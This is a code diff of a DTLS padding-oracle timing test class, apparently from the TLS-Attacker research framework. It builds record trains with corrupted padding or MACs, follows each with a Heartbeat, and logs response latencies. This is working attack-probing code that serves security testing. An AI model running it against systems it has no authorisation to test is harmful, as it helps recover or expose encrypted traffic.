@@ -22,7 +22,6 @@ package de.rub.nds.tlsattacker.attacks.impl;
 import de.rub.nds.tlsattacker.attacks.config.DtlsPaddingOracleAttackTestCommandConfig;
 import de.rub.nds.tlsattacker.tls.Attacker;
 import de.rub.nds.tlsattacker.dtls.record.handlers.RecordHandler;
-import de.rub.nds.tlsattacker.modifiablevariable.VariableModification;
 import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
 import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
@@ -42,6 +41,7 @@ import de.rub.nds.tlsattacker.transport.TransportHandler;
 import de.rub.nds.tlsattacker.util.RandomHelper;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.net.SocketTimeoutException;
 import java.util.ArrayList;
 import java.util.List;
 import org.apache.logging.log4j.LogManager;
@@ -65,6 +65,9 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
 
     private TransportHandler transportHandler;
 
+    private final ModifiableByteArray modifiedPaddingArray = new ModifiableByteArray(),
+	    modifiedMacArray = new ModifiableByteArray();
+
     public DtlsPaddingOracleAttackTest(DtlsPaddingOracleAttackTestCommandConfig config) {
 	super(config);
     }
@@ -75,32 +78,21 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
 	tlsContext = configHandler.initializeTlsContext(config);
 	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
 	recordHandler = (RecordHandler) tlsContext.getRecordHandler();
-
 	WorkflowTrace trace = tlsContext.getWorkflowTrace();
-
 	protocolMessages = trace.getProtocolMessages();
+	modifiedPaddingArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
+	modifiedMacArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 0x50, (byte) 0xFF, 0x1A, 0x7C },
+		0));
+	long[][] resultBuffer = new long[config.getNrOfRounds()][];
+	FileWriter fileWriter;
+	StringBuilder sb;
+	int counter = 0;
 
 	workflowExecutor.executeWorkflow();
 
-	FileWriter fileWriter = null;
-	Long[] latencyResult;
-	StringBuilder sb;
-
 	try {
-	    if (config.getResultFilePath() != null) {
-		fileWriter = new FileWriter(config.getResultFilePath(), true);
-	    }
 	    for (int i = 0; i < config.getNrOfRounds(); i++) {
-		latencyResult = executeAttackRound();
-
-		sb = new StringBuilder();
-		sb.append(latencyResult[0].toString());
-		sb.append("\t");
-		sb.append(latencyResult[1].toString());
-		sb.append("\n");
-		if (config.getResultFilePath() != null) {
-		    fileWriter.write(sb.toString());
-		}
+		resultBuffer[i] = executeAttackRound();
 
 		sb = new StringBuilder();
 		sb.append(i);
@@ -109,7 +101,25 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
 		sb.append(" rounds.\n");
 		LOGGER.info(sb.toString());
 	    }
+
 	    if (config.getResultFilePath() != null) {
+		sb = new StringBuilder();
+
+		for (long[] roundResults : resultBuffer) {
+		    sb.append(counter);
+		    sb.append(";invalid_Padding;");
+		    sb.append(roundResults[0]);
+		    sb.append("\n");
+		    counter++;
+		    sb.append(counter);
+		    sb.append(";invalid_MAC;");
+		    sb.append(roundResults[1]);
+		    sb.append("\n");
+		    counter++;
+		}
+
+		fileWriter = new FileWriter(config.getResultFilePath(), true);
+		fileWriter.write(sb.toString());
 		fileWriter.close();
 	    }
 	} catch (IOException e) {
@@ -121,94 +131,89 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
 	transportHandler.closeConnection();
     }
 
-    private Long[] executeAttackRound() throws IOException {
-	List<byte[]> invalidPaddingTrain = createInvalidPaddingMessageTrain(config.getTrainMessageSize(),
-		config.getMessagesPerTrain(), ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
-	List<byte[]> invalidMacTrain = createInvalidMacMessageTrain(config.getTrainMessageSize(),
-		config.getMessagesPerTrain(),
-		ByteArrayModificationFactory.xor(new byte[] { 0x50, (byte) 0xFF, 0x1A, 0x7C }, 0));
-	Long[] results = new Long[2];
+    private long[] executeAttackRound() throws IOException {
+	byte[] roundMessageData = new byte[config.getTrainMessageSize()];
+	RandomHelper.getRandom().nextBytes(roundMessageData);
+	byte[][] invalidPaddingTrain = createInvalidPaddingMessageTrain(config.getMessagesPerTrain(), roundMessageData);
+	byte[][] invalidMacTrain = createInvalidMacMessageTrain(config.getMessagesPerTrain(), roundMessageData);
+	long[] results = new long[2];
+        
 
 	for (byte[] record : invalidPaddingTrain) {
 	    transportHandler.sendData(record);
 	}
-
 	long startNanos = System.nanoTime();
-	transportHandler.fetchData();
+	try {
+	    transportHandler.fetchData();
+	} catch (SocketTimeoutException e) {
+	    LOGGER.info("Receive timeout when waiting for heartbeat answer (invalid padding)");
+	}
 	long endNanos = System.nanoTime();
 	results[0] = endNanos - startNanos;
 
+        
 	for (byte[] record : invalidMacTrain) {
 	    transportHandler.sendData(record);
 	}
-
 	startNanos = System.nanoTime();
-	transportHandler.fetchData();
+	try {
+	    transportHandler.fetchData();
+	} catch (SocketTimeoutException e) {
+	    LOGGER.info("Receive timeout when waiting for heartbeat answer (invalid MAC)");
+	}
 	endNanos = System.nanoTime();
 	results[1] = endNanos - startNanos;
+        
+        
 	return results;
     }
 
-    private List<byte[]> createInvalidPaddingMessageTrain(int l, int n, VariableModification<byte[]> modifier) {
-	List<byte[]> train = new ArrayList<>();
+    private byte[][] createInvalidPaddingMessageTrain(int n, byte[] messageData) {
+	byte[][] train = new byte[n + 1][];
 	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
-	byte[] messageData = new byte[l];
-	ModifiableByteArray padding = new ModifiableByteArray();
 	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
 	protocolMessages.add(apMessage);
 	Record record;
-
-	padding.setModification(modifier);
-	RandomHelper.getRandom().nextBytes(messageData);
 	apMessage.setData(messageData);
 
 	for (int i = 0; i < n; i++) {
 	    record = new Record();
-	    record.setPadding(padding);
+	    record.setPadding(modifiedPaddingArray);
 	    records.add(record);
-	    train.add(recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records));
+	    train[i] = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);
 	    records.remove(0);
 	}
 
+	records.add(new Record());
 	HeartbeatMessage hbMessage = new HeartbeatMessage();
 	protocolMessages.add(hbMessage);
-
-	messageData = hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage();
-	records.add(new Record());
-
-	train.add(recordHandler.wrapData(messageData, ProtocolMessageType.HEARTBEAT, records));
+	train[n] = recordHandler.wrapData(hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage(),
+		ProtocolMessageType.HEARTBEAT, records);
 
 	return train;
     }
 
-    private List<byte[]> createInvalidMacMessageTrain(int l, int n, VariableModification<byte[]> modifier) {
-	List<byte[]> train = new ArrayList<>();
+    private byte[][] createInvalidMacMessageTrain(int n, byte[] messageData) {
+	byte[][] train = new byte[n + 1][];
 	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
-	byte[] messageData = new byte[l];
-	ModifiableByteArray macData = new ModifiableByteArray();
 	Record record;
 	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
 	protocolMessages.add(apMessage);
-
-	macData.setModification(modifier);
-	RandomHelper.getRandom().nextBytes(messageData);
 	apMessage.setData(messageData);
 
 	for (int i = 0; i < n; i++) {
 	    record = new Record();
-	    record.setMac(macData);
+	    record.setMac(modifiedMacArray);
 	    records.add(record);
-	    train.add(recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records));
+	    train[i] = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);
 	    records.remove(0);
 	}
 
+	records.add(new Record());
 	HeartbeatMessage hbMessage = new HeartbeatMessage();
 	protocolMessages.add(hbMessage);
-
-	messageData = hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage();
-	records.add(new Record());
-
-	train.add(recordHandler.wrapData(messageData, ProtocolMessageType.HEARTBEAT, records));
+	train[n] = (recordHandler.wrapData(hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage(),
+		ProtocolMessageType.HEARTBEAT, records));
 
 	return train;
     }
